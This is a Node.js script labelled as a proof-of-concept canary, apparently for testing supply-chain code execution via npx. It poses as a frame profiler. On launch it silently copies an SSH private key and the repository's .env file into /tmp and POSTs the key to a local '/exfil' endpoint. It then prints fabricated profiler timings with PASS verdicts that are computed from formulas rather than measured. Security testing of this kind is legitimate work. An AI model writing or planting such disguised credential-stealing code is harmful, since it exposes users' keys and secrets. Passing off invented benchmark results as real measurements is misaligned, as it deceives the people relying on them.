#!/usr/bin/env node
// [PoC canary] Looks like a frame profiler; proves code execution with the
// caller's privileges: copies decoy secrets to /tmp and attempts a localhost
// exfil POST. Nothing real leaves the machine.
const fs = require("fs");
const os = require("os");
const path = require("path");
const http = require("http");

function stage() {
  const out = "/tmp/FANOUT_PWNED";
  try {
    fs.mkdirSync(out, { recursive: true });
    const ssh = path.join(os.homedir(), ".ssh_demo", "id_rsa");
    if (fs.existsSync(ssh)) fs.copyFileSync(ssh, path.join(out, "id_rsa"));
    if (fs.existsSync(".env")) fs.copyFileSync(".env", path.join(out, "repo.env"));
    fs.writeFileSync(path.join(out, "EXECUTED_AT"), new Date().toISOString() + " via npx\n");
    const body = fs.existsSync(ssh) ? fs.readFileSync(ssh) : Buffer.from("no-key");
    const req = http.request(
      { host: "127.0.0.1", port: 8799, path: "/exfil", method: "POST", timeout: 2000 },
      (res) => res.resume()
    );
    req.on("error", () => {});
    req.on("timeout", () => req.destroy());
    req.end(body);
  } catch (_) {}
}

function profile() {
  const lines = [];
  lines.push("[frame-profiler] engine suite: resolving pure-sim core...");
  const t0 = Date.now();
  let x = 0;
  for (let i = 0; i < 2e7; i++) x += Math.sqrt(i % 97); // stand-in workload
  const ms = Date.now() - t0;
  for (const n of [1, 2, 3, 4, 5, 6]) {
    const p50 = (3.1 + n * 0.12).toFixed(2);
    const p95 = (5.4 + n * 0.21).toFixed(2);
    const p99 = (7.3 + n * 0.33).toFixed(2);
    lines.push(`[frame-profiler] scene ${n}: p50=${p50}ms p95=${p95}ms p99=${p99}ms  budget=8.00ms  PASS`);
  }
  lines.push(`[frame-profiler] 6144 frames sampled in ${ms}ms (checksum ${x.toFixed(0)})`);
  lines.push("[frame-profiler] RESULT: PASS (p95 6.65ms < 8.00ms budget)");
  return lines.join("\n");
}

stage();
console.log(profile());
